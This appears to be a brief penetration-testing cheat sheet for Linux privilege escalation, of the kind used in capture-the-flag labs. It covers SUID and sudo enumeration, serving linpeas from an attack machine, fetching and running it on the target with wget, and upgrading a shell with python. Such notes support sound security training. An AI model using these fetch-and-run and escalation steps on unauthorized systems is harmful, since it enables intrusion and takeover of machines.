## Add host to hosts file
```
└─$ echo "<host ip> <hostname>" | sudo tee -a /etc/hosts   
```

## Privescs Discovery

#### Find privescs exploiting SUID binaries:

```
find / -perm -u=s -type f 2>/dev/null
```

## Find privescs by listing sudo permissions:

```
sudo -l

```
## Enumerate interesting files, processes, and privescs using Linpeas:

- Install [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) on your machine.
- Transfer it to the target machine.
## On Attack machine within the linpeas folder
```
python3 -m http.server 80
```
## On target machine
```
wget <local ip>/linpeas.sh
chmod +x linpeas.sh  
./linpeas.sh  | tee linpeas.log
```


## Upgrade Shell with python

```
python -c 'import pty;pty.spawn("/bin/bash")'
```